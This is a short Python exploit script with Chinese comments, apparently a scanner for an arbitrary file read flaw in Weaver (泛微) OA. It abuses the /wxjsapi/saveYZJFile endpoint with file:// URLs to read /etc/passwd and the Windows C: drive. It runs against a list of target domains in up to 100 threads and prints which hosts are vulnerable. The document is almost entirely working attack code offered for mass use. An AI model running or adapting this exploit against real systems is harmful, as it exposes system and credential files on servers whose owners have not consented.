# 泛微OA 任意文件读取
# 作者 charis

import requests
from requests.packages import urllib3
urllib3.disable_warnings()
from threading import Thread, enumerate
from time import sleep

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
}

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}

def postData(url, headers, proxies):
    try:
        s = ""
        windpoc = f"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
        linuxpoc = f"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
        wpoc = url.strip("\n") + windpoc
        lpoc = url.strip("\n") + linuxpoc
        requests.packages.urllib3.disable_warnings()
        re1 = requests.get(wpoc, headers=headers, proxies=proxies, verify=False)
        re2 = requests.get(lpoc, headers=headers, proxies=proxies, verify=False)
        if re1.text.find("iszip") >= 0:
            print("[+]存在漏洞目标windows系统", url)
        elif re2.text.find("txt") >= 0:
            print("[+]存在漏洞目标linux系统", url)

    except requests.exceptions.ConnectionError:
        pass

with open("D:\\code\\python\\exp\\泛微OA\\domain.txt", encoding="utf-8") as f:
    print("正在测试中....")
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, headers, proxies)).start()
        else:
            sleep(1)
